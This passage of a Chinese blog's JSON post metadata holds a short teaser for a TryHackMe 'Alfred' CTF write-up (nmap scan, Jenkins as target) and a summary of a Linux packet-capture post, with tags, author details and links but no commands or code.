获取信息开启靶机，获取靶机IP。我们直接使用nmap进行扫描，确认服务端口。扫描结果中的两个端口均为web服务(80,8080),从浏览器打开进行查看。我们的攻击重点就在Jenkins服务上，Jenk...","link":"","photos":[],"count_time":{"symbolsCount":"4.5k","symbolsTime":"4 mins."},"categories":[{"name":"CTF","slug":"CTF","count":6,"path":"api/categories/CTF.json"}],"tags":[{"name":"tryhackme","slug":"tryhackme","count":6,"path":"api/tags/tryhackme.json"},{"name":"Alfred","slug":"Alfred","count":1,"path":"api/tags/Alfred.json"},{"name":"Nishang","slug":"Nishang","count":1,"path":"api/tags/Nishang.json"},{"name":"Windows Privilege Escalation","slug":"Windows-Privilege-Escalation","count":4,"path":"api/tags/Windows-Privilege-Escalation.json"}],"author":{"name":"剑三","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"御剑乘风来 除魔天地间","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Linux网络抓包","uid":"9f9fe3f3013b488c2450ed12f2446a41","slug":"Linux网络抓包","date":"2022-03-17T17:29:47.691Z","updated":"2022-04-15T07:15:14.844Z","comments":true,"path":"api/articles/Linux网络抓包.json","keywords":null,"cover":"https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/linux/network/network.jpeg","text":"通过网络抓包功能捕获指定IP和端口的网络数据包、分析数据包内容，帮助定位网络故障和分析攻击行为，从而识别出网络通信的安全风险,常用的网络抓包工具有wireshark、tcpdump、ngrep等。 网络抓包环境网络不论传输什么样的数据，最终通过物理层传输的都是二进制，类似0101...","link":"","photos":[],"count_time":{"symbolsCount":"8.1k","symbolsTime":"7 mins."},"categories":[{"name":"Network","slug":"Network","count":1,"path":"api/categories/Network.json"}],"tags":[{"name":"network","slug":"network","count":1,"path":"api/tags/network.json"},{"name":"libpcap","slug":"libpcap","count":1,"path":"api/tags/libpcap.json"}],"author":{"name":"剑三","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"御剑乘风来 除魔天地间","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}